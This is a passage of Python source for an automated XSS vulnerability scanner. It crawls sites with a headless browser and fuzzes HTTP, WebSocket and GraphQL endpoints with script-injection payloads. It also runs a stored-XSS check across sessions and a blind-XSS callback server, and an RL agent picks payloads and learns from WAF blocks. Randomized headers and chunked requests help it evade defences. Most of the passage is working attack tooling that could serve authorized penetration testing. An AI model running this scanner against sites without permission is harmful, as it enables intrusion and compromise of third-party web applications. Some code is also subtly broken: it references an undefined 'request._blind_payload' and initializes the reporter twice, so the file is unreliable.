            ctx=br.new_context(ignore_https_errors=True,user_agent=UserAgent().random)
            page=ctx.new_page()
            def on_req(req):
                u=norm(req.url); sig=f"{req.method}:{u}"
                if urllib.parse.urlparse(u).netloc.lower()!=host or sig in seen_req: return
                seen_req.add(sig)
                m=req.method.upper(); is_json="json" in req.headers.get("content-type","").lower()
                try:
                    body=json.loads(req.post_data or "{}"); params=list(body.keys())
                except Exception:
                    qs=urllib.parse.urlparse(req.url).query; params=list(urllib.parse.parse_qs(qs).keys()) if qs else ["payload"]
                found.add(json.dumps({"url":u,"method":m if m in ("POST","PUT") else "GET",
                                      "json":is_json,"params":params,"template":body if is_json else {}}))
            page.on("request",on_req)
            page.goto(root,timeout=VERIFY_TIMEOUT,wait_until="networkidle")
            for _ in range(max_clicks):
                els=page.query_selector_all("a[href],button,[role=button],.router-link"); random.shuffle(els)
                for e in els:
                    try: e.click(timeout=2000); page.wait_for_timeout(1500); break
                    except Exception: continue
            ctx.close(); br.close()
    except Exception as e:
        dbg(f"[spa_dynamic_crawl] {e}")
    return [json.loads(x) for x in found]

# ─────────────────────────────────────────────────────────────────────────────
#  GRAPHQL FUZZING
# ─────────────────────────────────────────────────────────────────────────────
INTROSPECTION="""query IntrospectionQuery{__schema{queryType{name}mutationType{name}types{kind name fields{name args{name type{kind name ofType{kind}}}}}}}"""
def discover_graphql_ops(ep:str)->List[Tuple[str,List[str]]]:
    try:
        j=SESSION.post(ep,json={"query":INTROSPECTION},timeout=HTTP_TIMEOUT,verify=False).json()
        schema=j["data"]["__schema"]; ops=[]
        for kind in ("queryType","mutationType"):
            root=schema.get(kind); 
            if not root: continue
            for t in schema["types"]:
                if t["name"]==root["name"]:
                    for f in t["fields"]:
                        arg_names=[a["name"] for a in f["args"] if a["type"]["name"]=="String"]
                        if arg_names: ops.append((f["name"],arg_names))
        return ops
    except Exception: return []

def fuzz_graphql(ep:str)->None:
    for name,args_ in discover_graphql_ops(ep):
        for a in args_:
            pay="<img src=x onerror=alert(1)>"
            try:
                SESSION.post(ep,json={"query":f"mutation{{{name}({a}:\"{pay}\"){{__typename}}}}"},
                             timeout=HTTP_TIMEOUT,verify=False)
            except Exception as e:
                dbg(f"[fuzz_graphql] {e}")

# ─────────────────────────────────────────────────────────────────────────────
#  HTTP / WS FUZZERS
# ─────────────────────────────────────────────────────────────────────────────
global_visited_http:set[str]=set()

def set_deep(obj:Any,path:str,val:str)->None:
    parts=[p for p in re.split(r'\.|(\[\d+\])',path) if p and p.strip()]
    cur=obj
    for i,part in enumerate(parts):
        last=i==len(parts)-1
        if part.startswith('[') and part.endswith(']'):
            idx=int(part[1:-1])
            if last:
                if isinstance(cur,list) and idx<len(cur): cur[idx]=val
            else:
                if isinstance(cur[idx],(dict,list)): cur=cur[idx]
                else: cur[idx]={}; cur=cur[idx]
        else:
            if last: cur[part]=val
            else:
                if part not in cur or not isinstance(cur[part],(dict,list)): cur[part]={}
                cur=cur[part]

def fuzz_http(t:Dict[str,Any],use_chunked:bool=False)->None:
    ext = Path(urllib.parse.urlparse(t["url"]).path).suffix.lstrip('.').lower()
    if ext in static_exts: return
    key = f"{t['method']}:{t['url']}:{','.join(sorted(t['params']))}"
    if key in global_visited_http: return
    global_visited_http.add(key)
    
    target_param = random.choice(t["params"] or ["payload"])
    payload = custom_payload if custom_payload else agent.choose(target_param)
    sent_data={p:(payload if p==target_param else "") for p in t["params"]}
    rate_limit(); session_splice()
    try:
        if t.get("json") and "template" in t:
            body=json.loads(json.dumps(t["template"]))
            set_deep(body,target_param,payload)
            resp=SESSION.post(t["url"],json=body,headers=random_headers(),
                              timeout=HTTP_TIMEOUT,verify=False)
        else:
            if t["method"]=="GET":
                resp=SESSION.get(t["url"],params=sent_data,headers=random_headers(),
                                 timeout=HTTP_TIMEOUT,verify=False) if not use_chunked else \
                     chunked_fuzz_request(t["url"],"GET",random_headers(),urllib.parse.urlencode(sent_data))
            else:
                resp=SESSION.post(t["url"],data=sent_data,headers=random_headers(),
                                  timeout=HTTP_TIMEOUT,verify=False) if not use_chunked else \
                     chunked_fuzz_request(t["url"],"POST",random_headers(),urllib.parse.urlencode(sent_data))
        code,text=resp.status_code,resp.text.lower()
        reward=R_OTHER
        if code in (403,429,503) or any(x in text for x in ("captcha","denied","blocked")):
            reward=R_BLOCK
        elif code>=500: reward=R_SERROR
        elif payload.lower() in text:
            reward=R_REFLECT
            if verify(t["url"],t["method"],sent_data,t.get("json",False)):
                reward=R_CONFIRM
                log_hit(t["url"],t["method"],payload,t["params"])
        agent.reward(target_param,payload,reward)
    except Exception as e:
        dbg(f"[fuzz_http] {e}"); agent.reward(target_param,payload,R_FAIL)
    jitter()

def fuzz_ws(t:Dict[str,Any])->None:
    if not websocket or not t["url"].startswith(("ws://","wss://")): return
    marker=randstr(); hit=False
    body=json.loads(json.dumps(t.get("template") or {}))
    param=random.choice(t["params"] or ["payload"])
    set_deep(body,param,f"<img src=x onerror=alert('{marker}')>")
    def on_msg(ws,msg): nonlocal hit; hit|=(marker in msg)
    try:
        ws=websocket.WebSocketApp(t["url"],on_message=on_msg,header=random_headers())
        thr=threading.Thread(target=ws.run_forever,kwargs={"sslopt":{"cert_reqs":ssl.CERT_NONE}})
        thr.daemon=True; thr.start(); time.sleep(1); ws.send(json.dumps(body)); time.sleep(3); ws.close()
        if hit: log_hit(t["url"],"WS",json.dumps(body),t["params"])
    except Exception as e:
        dbg(f"[fuzz_ws] {e}")

# ─────────────────────────────────────────────────────────────────────────────
#  MULTI-SESSION STORED XSS CHECK
# ─────────────────────────────────────────────────────────────────────────────
def multi_session_stored_check(targets:List[Dict[str,Any]])->None:
    # pass-1 inject
    for t in targets:
        if t["method"] in ("POST","PUT") and not t.get("json",False):
            for p in all_stored_payloads:
                try:
                    cs=rotate_csrf_token(SESSION,t["url"],args.csrf_field) or ""
                    data={k:p for k in t["params"]}
                    if cs: data[args.csrf_field]=cs
                    SESSION.post(t["url"],data=data,headers=random_headers(),
                                 timeout=HTTP_TIMEOUT,verify=False)
                except Exception: pass
    # pass-2 verify
    new_sess=get_authenticated_session()
    for t in targets:
        if verify(t["url"],t["method"],{},False):
            log_hit(t["url"],"STORED","(multi-session)",t["params"])

# ─────────────────────────────────────────────────────────────────────────────
#  MAIN EXECUTION
# ─────────────────────────────────────────────────────────────────────────────
AUTOTEST=["http://xss-game.appspot.com/","http://xss-game.appspot.com/level1",
          "https://juice-shop.herokuapp.com/"]

async def main():
    # Initialize reporting engine first
    reporter = ReportingEngine(
        args.json or args.txt or "noctua_findings.md", 
        "json" if args.json else "txt" if args.txt else "markdown"
    )
    mode = "all"
    if args.reflected: mode = "reflected"
    elif args.stored:  mode = "stored"
    elif args.blind:   mode = "blind"
    
    roots = [smart_url(u) for u in (AUTOTEST if args.autotest else [args.url])] if args.url or args.autotest else \
           (ap.print_help() or sys.exit(1))
    
    # Initialize reporting engine
    reporter = ReportingEngine(args.json or args.txt or "noctua_findings.md", 
                              "json" if args.json else "txt" if args.txt else "markdown")
    
    # Start Blind XSS Callback Server (if enabled)
    callback_server = None
    if args.blind or args.blind_xss:
        callback_server = BlindXSSCallbackServer(host=args.blind_host, port=args.blind_port)
        asyncio.create_task(callback_server.start())
        logging.info(f"[BlindXSS] Callback server started on {args.blind_host}:{args.blind_port}")

    for root in roots:
        logging.info(f"┌─▶ Target: {root}")
        waf, server = detect_context(root)
        logging.info(f"[CTX] WAF={waf} | Server={server}")
        
        global agent
        agent = AdvancedRLAgent(waf, server, Path(args.qtable_file) if args.qtable_file else None,
                               enabled=args.self_reinforcement)
        
        # Discovery Phase
        logging.info("[CRAWL] Starting discovery...")
        static_t = crawl_static(root, args.max_pages) if args.crawl else []
        dynamic_t = crawl_dynamic(root)
        spa_t = spa_dynamic_crawl(root) if args.simulate_spa else []
        all_t = static_t + dynamic_t + spa_t
        
        # Dedupe targets
        uniq = {f"{t['method']}:{t['url']}:{','.join(sorted(t['params']))}": t for t in all_t}
        http_t = [t for t in uniq.values() if not t["url"].startswith(("ws://", "wss://"))]
        ws_t = [t for t in uniq.values() if t["url"].startswith(("ws://", "wss://"))]
        
        # Specialized fuzzing
        if "graphql" in root.lower():
            fuzz_graphql(root)
            
        if args.multi_session and (mode in ("stored", "all")):
            multi_session_stored_check(http_t)
            
        # Regular fuzzing
        exec_pool = ThreadPoolExecutor(max_workers=args.threads)
        
        # Blind XSS testing
        if mode in ("all", "blind") and callback_server:
            unique_id = randstr(8)
            blind_payloads = callback_server.get_payloads(unique_id)
            
            # Create targets with blind payloads
            blind_targets = []
            for t in http_t:
                for payload in blind_payloads:
                    bt = t.copy()
                    bt["params"] = bt.get("params", []) or ["payload"]
                    bt["_blind_payload"] = payload
                    blind_targets.append(bt)
            
            # Temporary override for blind testing
            original_choose = agent.choose
            try:
                agent.choose = lambda param: request._blind_payload
                
                for t in blind_targets:
                    exec_pool.submit(fuzz_http, t)
                    if args.chunked:
                        exec_pool.submit(fuzz_http, t, True)
            finally:
                agent.choose = original_choose
        
        # Standard reflected XSS testing
        if mode in ("all", "reflected"):
            for t in http_t:
                exec_pool.submit(fuzz_http, t)
                if args.chunked:
                    exec_pool.submit(fuzz_http, t, True)
            
            for w in ws_t:
                exec_pool.submit(fuzz_ws, w)
        
        exec_pool.shutdown(wait=True)
        
        # DOM Analysis Phase
        if args.deep_dom and sync_playwright:
            try:
                with sync_playwright() as p:
                    browser = p.chromium.launch(headless=not args.headed)
                    context = browser.new_context(ignore_https_errors=True)
                    page = context.new_page()
                    
                    analyzer = DomXssAnalyzer(page)
                    for url in {t["url"] for t in http_t}:
                        try:
                            page.goto(url, wait_until="networkidle")
                            analyzer.analyze()
                            
                            for vuln in analyzer.vulnerabilities:
                                reporter.add_finding(
                                    url=url,
                                    param="DOM",
                                    payload=vuln['payload'],
                                    vuln_type="DOM XSS",
                                    evidence=f"Sink: {vuln['sink']}"
                                )
                        except Exception as e:
                            logging.error(f"[DOM] Error analyzing {url}: {e}")
                    
                    browser.close()
            except Exception as e:
                logging.error(f"[DOM Analysis] Error: {e}")

    # Check for blind XSS callbacks
    if callback_server:
        logging.info(f"[BlindXSS] Waiting {args.blind_timeout}s for callbacks...")
        await asyncio.sleep(args.blind_timeout)
        
        if callback_server.found_callbacks:
            logging.critical("[BlindXSS] Found the following callbacks:")
            for uid, data in callback_server.found_callbacks.items():
                logging.critical(f"Callback ID: {uid}")
                logging.critical(f"Source IP: {data['source_ip']}")
                logging.critical(f"Data: {json.dumps(data, indent=2)}")
                
                reporter.add_finding(
                    url="Blind XSS Callback",
                    param="N/A",
                    payload=uid,
                    vuln_type="Blind XSS",
                    evidence=json.dumps(data, indent=2)
                )

    # Final reporting
    reporter.write()
    if SARIF_OUTPUT_FILE:
        write_sarif()
    agent.save()
    logging.info(f"└─ Findings saved → {reporter.output_file if hasattr(reporter, 'output_file') else LOGFILE.resolve()}\n")

if __name__=="__main__":
    if sys.platform == "win32":
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logging.info("Scan aborted by user.")
